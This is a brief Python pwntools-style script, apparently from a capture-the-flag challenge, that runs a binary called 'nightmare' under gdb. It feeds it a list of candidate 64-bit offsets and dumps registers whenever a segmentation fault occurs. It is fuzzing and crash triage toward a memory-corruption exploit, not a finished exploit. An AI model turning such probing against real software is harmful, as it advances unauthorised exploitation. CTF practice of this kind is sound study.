#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./nightmare')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)
context.log_level='critical'
libc=SetupLibcELF()
a=[2535448 ,2535512 ,2535520 ,2536184 ,2536736 ,2536744 ,2543600 ,2544504 ,2544512 ,2544520]
# for i in range(0, 0xffffffff, 8):
for i in a:
	io = auto_gdb(exe.path)
	inp = f"{p64(i)}\n\xcc"
	f=open('a.txt','w').write(inp)
	gdb_cmd("r")
	sl(p64(2469872+i))
	sl(b"\xcc")
	sleep(0.5)
	a=re()
	if b"SIGSEGV" in a:
		warning(f"SEGMENTATION FAULT {2469872+i}")
		sl("info registers")
		sleep(0.5)
		print(re().decode('utf-8'))
		pause()
	io.close()